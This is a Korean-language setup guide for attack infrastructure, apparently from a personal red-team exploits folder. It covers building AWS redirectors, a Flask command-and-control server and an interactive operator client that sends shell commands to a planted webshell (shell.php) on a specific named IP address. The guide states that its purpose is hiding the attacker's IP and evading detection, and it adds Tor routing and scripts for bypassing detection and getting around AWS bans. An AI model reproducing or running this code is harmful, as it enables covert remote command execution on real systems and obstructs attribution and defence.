# C2 서버 및 리다이렉터 설정 가이드

**목적:** IP 난독화 및 탐지 우회를 위한 인프라 구축

---

## 아키텍처

```
공격자 (로컬)
    ↓
[Tor/VPN] (선택)
    ↓
리다이렉터 서버 (AWS EC2 #1)
    ↓
타겟 서버 (43.201.154.142)

또는

공격자 (로컬)
    ↓
오퍼레이터 서버 (AWS EC2 #2)
    ↓
C2 서버 (AWS EC2 #3)
    ↓
리다이렉터 서버 (AWS EC2 #1)
    ↓
타겟 서버
```

---

## 1. 리다이렉터 서버 설정 (AWS EC2)

### A. EC2 인스턴스 생성

```bash
# AWS CLI로 인스턴스 생성
aws ec2 run-instances \
  --image-id ami-0c76973fbe0ee100c \
  --instance-type t2.micro \
  --key-name your-key \
  --security-group-ids sg-xxxxx \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=Redirector}]'

# 퍼블릭 IP 확인
aws ec2 describe-instances \
  --filters "Name=tag:Name,Values=Redirector" \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text
```

### B. 보안 그룹 설정

```bash
# 보안 그룹 생성
aws ec2 create-security-group \
  --group-name redirector-sg \
  --description "Redirector security group"

# HTTP 허용
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 80 \
  --cidr 0.0.0.0/0

# HTTPS 허용
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 443 \
  --cidr 0.0.0.0/0

# SSH 허용 (본인 IP만)
MY_IP=$(curl -s http://checkip.amazonaws.com)
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 22 \
  --cidr ${MY_IP}/32
```

### C. Nginx 리버스 프록시 설정

**SSH 접속:**
```bash
ssh -i ~/.ssh/your-key.pem ec2-user@REDIRECTOR_IP
```

**Nginx 설치:**
```bash
sudo yum update -y
sudo yum install -y nginx

# 또는 Amazon Linux 2023
sudo dnf install -y nginx
```

**Nginx 설정:**
```bash
sudo nano /etc/nginx/nginx.conf
```

**설정 파일 내용:**
```nginx
user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';

    access_log /var/log/nginx/access.log main;

    sendfile            on;
    tcp_nopush          on;
    tcp_nodelay         on;
    keepalive_timeout   65;
    types_hash_max_size 2048;

    include             /etc/nginx/mime.types;
    default_type        application/octet-stream;

    # 리다이렉터 설정
    server {
        listen 80;
        server_name _;

        # 타겟 서버로 프록시
        location / {
            # 타겟 IP 주소
            proxy_pass http://43.201.154.142;

            # 헤더 전달
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # 타임아웃 설정
            proxy_connect_timeout 60s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;

            # 버퍼 설정
            proxy_buffering off;
            proxy_buffer_size 4k;
        }

        # 웹쉘 전용 경로 (선택사항)
        location /uploads/ {
            proxy_pass http://43.201.154.142/uploads/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_buffering off;
        }
    }
}
```

**Nginx 시작:**
```bash
sudo systemctl enable nginx
sudo systemctl start nginx
sudo systemctl status nginx
```

**테스트:**
```bash
# 로컬에서 테스트
curl http://REDIRECTOR_IP/

# 응답이 타겟 서버의 응답과 동일해야 함
```

---

## 2. C2 서버 설정 (AWS EC2)

### A. 간단한 C2 서버 (Python)

**SSH 접속:**
```bash
ssh -i ~/.ssh/your-key.pem ec2-user@C2_IP
```

**C2 서버 스크립트 작성:**
```bash
nano c2_server.py
```

**c2_server.py:**
```python
#!/usr/bin/env python3
"""
간단한 C2 서버
- 명령 수신 및 전달
- 로그 기록
"""

from flask import Flask, request, jsonify
import requests
import logging
from datetime import datetime

app = Flask(__name__)

# 로깅 설정
logging.basicConfig(
    filename='/var/log/c2_server.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

# 타겟 설정
TARGET_IP = "43.201.154.142"
REDIRECTOR_IP = None  # 또는 리다이렉터 IP

@app.route('/health', methods=['GET'])
def health():
    """헬스 체크"""
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@app.route('/cmd', methods=['POST'])
def execute_command():
    """명령 실행 요청"""
    data = request.json
    cmd = data.get('cmd')
    webshell_url = data.get('webshell_url')

    if not cmd or not webshell_url:
        return jsonify({'error': 'Missing parameters'}), 400

    # 로깅
    logging.info(f"Command: {cmd} | Webshell: {webshell_url} | IP: {request.remote_addr}")

    # 타겟 또는 리다이렉터로 전달
    target_url = f"{webshell_url}?x={cmd}"

    try:
        # 리다이렉터가 있으면 사용
        if REDIRECTOR_IP:
            proxies = {
                'http': f'http://{REDIRECTOR_IP}:80',
                'https': f'http://{REDIRECTOR_IP}:80'
            }
            response = requests.get(target_url, proxies=proxies, timeout=30)
        else:
            response = requests.get(target_url, timeout=30)

        # 결과 반환
        return jsonify({
            'status': 'success',
            'result': response.text,
            'status_code': response.status_code
        })

    except Exception as e:
        logging.error(f"Error: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload_webshell():
    """웹쉘 업로드 요청"""
    # 구현 생략 (필요 시 추가)
    pass

if __name__ == '__main__':
    # 0.0.0.0:5000에서 실행
    app.run(host='0.0.0.0', port=5000, debug=False)
```

**Flask 설치 및 실행:**
```bash
# Python3 및 pip 설치
sudo yum install -y python3 python3-pip

# Flask 설치
pip3 install flask requests

# C2 서버 실행 (백그라운드)
nohup python3 c2_server.py > /var/log/c2_output.log 2>&1 &

# 프로세스 확인
ps aux | grep c2_server.py
```

**테스트:**
```bash
# 헬스 체크
curl http://C2_IP:5000/health

# 명령 실행 테스트
curl -X POST http://C2_IP:5000/cmd \
  -H "Content-Type: application/json" \
  -d '{"cmd":"whoami", "webshell_url":"http://43.201.154.142/uploads/shell.php"}'
```

---

## 3. 오퍼레이터 서버 설정

### A. 오퍼레이터 서버 역할

- 공격자의 로컬 머신에서 C2로 명령 전달
- 여러 C2 서버 관리
- 로그 수집 및 분석

### B. 로컬 오퍼레이터 스크립트

**operator.py:**
```python
#!/usr/bin/env python3
"""
오퍼레이터 스크립트 - C2 서버 제어
"""

import requests
import sys

class Operator:
    def __init__(self, c2_url):
        self.c2_url = c2_url

    def execute_command(self, cmd, webshell_url):
        """C2를 통해 명령 실행"""
        url = f"{self.c2_url}/cmd"
        data = {
            'cmd': cmd,
            'webshell_url': webshell_url
        }

        try:
            response = requests.post(url, json=data, timeout=30)
            result = response.json()

            if result.get('status') == 'success':
                print(f"[+] 명령 실행 성공:")
                print(result.get('result'))
                return True
            else:
                print(f"[-] 오류: {result.get('error')}")
                return False

        except Exception as e:
            print(f"[-] 연결 오류: {str(e)}")
            return False

    def health_check(self):
        """C2 서버 상태 확인"""
        try:
            response = requests.get(f"{self.c2_url}/health", timeout=10)
            result = response.json()
            print(f"[+] C2 서버 상태: {result}")
            return True
        except Exception as e:
            print(f"[-] C2 서버 연결 불가: {str(e)}")
            return False


def main():
    # C2 서버 URL
    c2_url = input("C2 서버 URL (예: http://1.2.3.4:5000): ").strip()
    webshell_url = input("웹쉘 URL (예: http://43.201.154.142/uploads/shell.php): ").strip()

    operator = Operator(c2_url)

    # 헬스 체크
    print("\n[*] C2 서버 연결 확인...")
    if not operator.health_check():
        print("[-] C2 서버에 연결할 수 없습니다")
        return

    # 대화형 모드
    print("\n[+] 대화형 모드 시작")
    print("[*] 'exit' 입력 시 종료\n")

    while True:
        try:
            cmd = input("command> ").strip()

            if cmd.lower() in ['exit', 'quit', 'q']:
                break

            if not cmd:
                continue

            operator.execute_command(cmd, webshell_url)
            print()

        except KeyboardInterrupt:
            print("\n[*] 종료")
            break


if __name__ == "__main__":
    main()
```

**사용:**
```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H/2025-11-14/exploits
python3 operator.py

# C2 서버 URL: http://YOUR_C2_IP:5000
# 웹쉘 URL: http://43.201.154.142/uploads/shell.php
# command> whoami
```

---

## 4. 메인 스크립트에서 C2/리다이렉터 사용

### 방법 1: 리다이렉터만 사용

```bash
python3 01_detection_bypass_webshell.py

# 타겟 IP: REDIRECTOR_IP (리다이렉터 IP 입력)
# 프록시: 4 (없음)
# C2 서버: (Enter 스킵)
# 리다이렉터: REDIRECTOR_IP
```

### 방법 2: Tor + 리다이렉터

```bash
# Tor 시작
brew services start tor

python3 01_detection_bypass_webshell.py

# 타겟 IP: REDIRECTOR_IP
# 프록시: 1 (Tor)
# 리다이렉터: REDIRECTOR_IP
```

### 방법 3: C2 + 리다이렉터 (오퍼레이터)

```bash
# C2 서버가 리다이렉터를 통해 타겟 접근
python3 operator.py

# C2 URL: http://C2_IP:5000
# 웹쉘 URL: http://REDIRECTOR_IP/uploads/shell.php
```

---

## 5. AWS CLI를 통한 빠른 설정

### 스크립트로 자동화

**setup_infrastructure.sh:**
```bash
#!/bin/bash

echo "[*] AWS 인프라 설정 시작..."

# 1. 리다이렉터 인스턴스 생성
echo "[*] 리다이렉터 생성..."
REDIRECTOR_ID=$(aws ec2 run-instances \
  --image-id ami-0c76973fbe0ee100c \
  --instance-type t2.micro \
  --key-name your-key \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=Redirector}]' \
  --query 'Instances[0].InstanceId' \
  --output text)

echo "[+] 리다이렉터 ID: $REDIRECTOR_ID"

# 2. C2 서버 생성
echo "[*] C2 서버 생성..."
C2_ID=$(aws ec2 run-instances \
  --image-id ami-0c76973fbe0ee100c \
  --instance-type t2.micro \
  --key-name your-key \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=C2-Server}]' \
  --query 'Instances[0].InstanceId' \
  --output text)

echo "[+] C2 서버 ID: $C2_ID"

# 3. 인스턴스 시작 대기
echo "[*] 인스턴스 시작 대기..."
aws ec2 wait instance-running --instance-ids $REDIRECTOR_ID $C2_ID

# 4. IP 주소 확인
REDIRECTOR_IP=$(aws ec2 describe-instances \
  --instance-ids $REDIRECTOR_ID \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text)

C2_IP=$(aws ec2 describe-instances \
  --instance-ids $C2_ID \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text)

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   인프라 설정 완료                                        ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "리다이렉터 IP: $REDIRECTOR_IP"
echo "C2 서버 IP: $C2_IP"
echo ""
echo "다음 단계:"
echo "1. 리다이렉터 설정: ssh -i ~/.ssh/your-key.pem ec2-user@$REDIRECTOR_IP"
echo "2. C2 서버 설정: ssh -i ~/.ssh/your-key.pem ec2-user@$C2_IP"
echo ""
```

---

## 요약

### 빠른 시작 (Tor만 사용)

```bash
# 1. Tor 설치 및 시작
brew install tor
brew services start tor

# 2. 스크립트 실행
python3 01_detection_bypass_webshell.py
# 프록시: 1 (Tor)
```

### 고급 설정 (AWS 인프라)

```bash
# 1. AWS 차단 해제
./04_aws_unban_ip.sh

# 2. 리다이렉터 설정 (Nginx)
# 3. C2 서버 설정 (Flask)
# 4. 오퍼레이터로 제어
```

---

**작성일:** 2025-11-14
**참고:** 모든 AWS 리소스는 사용 후 삭제하여 비용 절감
